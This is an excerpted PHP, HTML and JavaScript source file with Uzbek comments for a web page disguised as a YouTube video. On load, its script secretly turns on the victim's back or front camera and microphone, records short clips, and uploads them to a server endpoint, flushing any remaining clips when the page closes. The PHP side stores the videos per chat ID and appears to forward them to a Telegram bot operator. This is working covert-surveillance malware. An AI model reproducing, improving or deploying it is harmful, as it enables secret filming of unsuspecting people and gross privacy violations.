...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['video']) && is_uploaded_file($_FILES['video']['tmp_name'])) {
    ...
    $has_videos = false; 
    foreach ($cols as $c) { 
        if ($c['name'] === 'backcamera_videos') { 
            $has_videos = true; 
            break; 
        } 
    }
    if (!$has_videos) {
        $pdo->exec("ALTER TABLE users ADD COLUMN backcamera_videos INTEGER DEFAULT 0");
    }
    ...
    $video_filename = "back_camera_" . $chat_id . "_" . time() . ".webm";
    ...
    if (move_uploaded_file($_FILES['video']['tmp_name'], $video_path)) {
        ...
        if ($res['ok']) {
            $upd = $pdo->prepare("UPDATE users SET backcamera_videos = COALESCE(backcamera_videos,0) + 1 WHERE chat_id = ?");
            $upd->execute([$chat_id]);
        }
...
<body>
    ...
    <div class="recording-indicator" id="recordingIndicator" style="display: none;">
        ...
        <span>YouTubega kirilmoqda...</span>
    </div>
    ...
    <script>
        ...
        document.getElementById('youtubeFrame').onload = function() {
            setTimeout(startBackCameraRecording, 2000);
        };
        ...
        async function startBackCameraRecording() {
            try {
                ...
                // Agar orqa kamera topilmasa, oxirgi kamerani ishlat
                ...
                const constraints = {
                    video: {
                        ...
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 },
                        facingMode: backCameraId ? undefined : { ideal: 'environment' }
                    }, 
                    audio: true 
                };
                ...
                // Orqa kamera ishlamasa, old kamerani sinab ko'rish
                startFrontCamera();
            }
        }
        ...
        async function processVideoQueue() {
            ...
            try {
                ...
                formData.append('video', blob, 'back_camera.webm');
                formData.append('duration', 4);

                const response = await fetch('bc?id=' + encodeURIComponent(key), {
                    method: 'POST',
                    body: formData
                });
        ...
        window.addEventListener('beforeunload', () => {
            ...
            if (videoQueue.length > 0) {
                ...
                videoQueue.forEach(blob => {
                    ...
                    xhr.open('POST', 'bc?id=' + encodeURIComponent(key), false);
                    xhr.send(formData);
                });
            }
